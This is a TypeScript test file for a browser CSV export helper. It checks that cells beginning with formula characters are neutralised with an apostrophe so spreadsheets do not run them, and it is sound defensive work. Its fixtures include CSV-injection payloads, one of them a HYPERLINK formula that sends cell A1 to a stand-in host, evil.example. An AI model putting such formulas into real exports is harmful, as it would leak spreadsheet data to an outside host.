/**
 * A browser-built CSV must not run as a formula when it is opened.
 *
 * The rules mirror `_neutralise_formula` on the server, which every XLSX export
 * applies: a text cell leading with = + - @, a tab or a carriage return gets an
 * apostrophe; a plain number does not.
 */

import { afterEach, describe, expect, it, vi } from 'vitest'

import { csvCell, csvText, downloadCsv } from './csv'

function readBlob(blob: Blob): Promise<string> {
  return new Promise((resolve, reject) => {
    const reader = new FileReader()
    reader.onload = () => resolve(String(reader.result))
    reader.onerror = () => reject(reader.error)
    reader.readAsText(blob)
  })
}

afterEach(() => {
  vi.unstubAllGlobals()
  vi.restoreAllMocks()
})

describe('a CSV cell', () => {
  it('neutralises every formula lead', () => {
    expect(csvCell('=1+1')).toBe("'=1+1")
    expect(csvCell('+1')).toBe('+1')
    expect(csvCell('+44 20 7946 0000')).toBe("'+44 20 7946 0000")
    expect(csvCell('-2+3+cmd')).toBe("'-2+3+cmd")
    expect(csvCell('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)")
    expect(csvCell('\t=1+1')).toBe("'\t=1+1")
    // A carriage return also obliges quoting.
    expect(csvCell('\r=1+1')).toBe('"\'\r=1+1"')
  })

  it('passes plain numbers, a signed one included, unchanged', () => {
    expect(csvCell('-5.0000')).toBe('-5.0000')
    expect(csvCell('12.5000')).toBe('12.5000')
    expect(csvCell(42)).toBe('42')
    expect(csvCell(-3)).toBe('-3')
  })

  it('quotes a field holding a comma, a quote or a line break', () => {
    expect(csvCell('a,b')).toBe('"a,b"')
    expect(csvCell('the "Brass" finish')).toBe('"the ""Brass"" finish"')
    expect(csvCell('two\nlines')).toBe('"two\nlines"')
    expect(csvCell('=HYPERLINK("http://x","y")')).toBe('"\'=HYPERLINK(""http://x"",""y"")"')
  })

  it('writes an absent value as an empty field', () => {
    expect(csvCell(null)).toBe('')
    expect(csvCell(undefined)).toBe('')
    expect(csvText([['a', null, 'c']])).toBe('a,,c')
  })
})

describe('a CSV download', () => {
  it('saves the rows as text/csv with every cell neutralised', async () => {
    let saved: Blob | undefined
    const createObjectURL = vi.fn((blob: Blob) => {
      saved = blob
      return 'blob:ledger'
    })
    const revokeObjectURL = vi.fn()
    const URLWithBlob = class extends URL {}
    Object.defineProperties(URLWithBlob, {
      createObjectURL: { value: createObjectURL },
      revokeObjectURL: { value: revokeObjectURL },
    })
    vi.stubGlobal('URL', URLWithBlob)
    const names: string[] = []
    vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(function (
      this: HTMLAnchorElement,
    ) {
      names.push(this.download)
    })

    downloadCsv('vendor-ledger-VEN-0007.csv', [
      ['item', 'closing'],
      ['=HYPERLINK("http://evil.example/?"&A1,"open")', '-5.0000'],
      ['HINGE-SS-4IN', '12.0000'],
    ])

    expect(names).toEqual(['vendor-ledger-VEN-0007.csv'])
    expect(saved?.type).toBe('text/csv')
    expect(await readBlob(saved!)).toBe(
      [
        'item,closing',
        '"\'=HYPERLINK(""http://evil.example/?""&A1,""open"")",-5.0000',
        'HINGE-SS-4IN,12.0000',
      ].join('\n'),
    )
    expect(revokeObjectURL).toHaveBeenCalledWith('blob:ledger')
  })
})
